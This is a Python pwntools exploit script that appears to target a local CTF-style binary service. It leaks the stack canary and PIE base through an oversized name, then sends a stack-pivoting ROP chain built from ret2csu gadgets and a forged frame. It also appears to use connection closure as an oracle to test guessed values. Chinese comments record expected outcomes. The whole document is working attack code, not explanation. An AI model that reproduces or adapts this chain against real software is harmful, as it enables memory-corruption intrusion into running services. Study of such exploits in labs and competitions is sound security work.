import time, select
from pwn import *
context.arch="amd64"; context.log_level="error"
HOST,PORT="127.0.0.1",32911
POP_RDI=0x200603; CSU_POP=0x2005fa; CSU_CALL=0x2005e0; GET_INPUT=0x20031c
LEAVE_RET=0x20059d; GETNUM=0x2003aa; CMP=0x20038b; GOT_READ=0x600fa8
CSU_INIT=0x2005a0; STAGE2=0x601200; FRAME=0x601500; CONS=0x601700; SCR=0x601e00
SIZE_LEAK=0x59
def csu_read(pie, fd, dst, n):
    return (p64(pie+CSU_POP)+p64(0)+p64(1)+p64(pie+GOT_READ)+p64(fd)+p64(dst)+p64(n)
            +p64(pie+CSU_CALL)+p64(0)+p64(0)*6)
def run(fix, guess, fd=3, big=40000):
    p=remote(HOST,PORT)
    try:
        p.recvuntil(b"name size",timeout=5); p.send(b"136\n"); p.recvuntil(b"> ",timeout=5)
        p.send(b"A"*(SIZE_LEAK-1)+b"X"+b"\n")
        d=p.recvuntil(b"Now you have 1 choice to change your name.",timeout=5)
        body=d.split(b"Your name is: ",1)[1].rsplit(b"\nNow you have 1 choice",1)[0]
        if len(body)<SIZE_LEAK+13: return None
        canary=b"\x00"+body[SIZE_LEAK:SIZE_LEAK+7]
        pie=u64(body[SIZE_LEAK+7:SIZE_LEAK+13].ljust(8,b"\x00"))-CSU_INIT
        stage2=pie+STAGE2; frame=pie+FRAME; scr=pie+SCR; cons=pie+CONS
        chain =p64(0)+csu_read(pie,fd,scr,0)+csu_read(pie,fd,frame-0x1c,0)
        chain+=p64(pie+0x2005fb)+p64(frame)+p64(0)*4
        chain+=p64(pie+GETNUM)+p64(pie+CMP)
        blob=bytearray(b"\x00"*0x600); blob[0:len(chain)]=chain
        fb=FRAME-STAGE2-0x20
        blob[fb+0x04:fb+0x08]=p32(fix)
        blob[fb+0x08:fb+0x10]=p64(frame+8)     # store 打坏 [frame+8]
        blob[fb+0x14:fb+0x18]=p32(0)
        blob[fb+0x18:fb+0x20]=canary
        blob[fb+0x20:fb+0x28]=p64(0)
        blob[fb+0x28:fb+0x30]=p64(cons)
        # 消费链: pop rdi;ret -> scratch ; get_input  (esi 已实测有效, 会吃掉 ~40KB)
        c =p64(pie+POP_RDI)+p64(scr)+p64(pie+GET_INPUT)
        c+=p64(pie+POP_RDI)+p64(scr)+p64(pie+GET_INPUT)
        c+=p64(0)
        blob[CONS-STAGE2:CONS-STAGE2+len(c)]=c
        blob=bytes(blob)
        if b"\n" in blob: return None
        p1=b"B"*0x58+canary+p64(stage2)+p64(pie+POP_RDI)+p64(stage2)+p64(pie+GET_INPUT)+p64(pie+LEAVE_RET)
        p.send(p1); time.sleep(1.05); p.send(blob+b"\n"); time.sleep(0.12)
        p.send(("%d\n"%guess).encode()+b"Q"*11); time.sleep(0.25)
        try: p.send(b"Z"*big)
        except Exception: return True
        t0=time.time()
        while time.time()-t0<2.2:
            r,_,_=select.select([p.sock],[],[],0.1)
            if r:
                try: dd=p.sock.recv(4096)
                except Exception: return True
                if not dd: return True
        return False
    except Exception: return None
    finally: p.close()
for fix,g,exp in ((0x41,0x30,"关(真)"),(0x41,0x50,"开(假)"),(0x41,0x41,"开(假)")):
    r=None
    for _ in range(4):
        r=run(fix,g)
        if r is not None: break
    print("fix=0x%02x guess=0x%02x -> closed=%s (期望 %s)"%(fix,g,r,exp), flush=True)
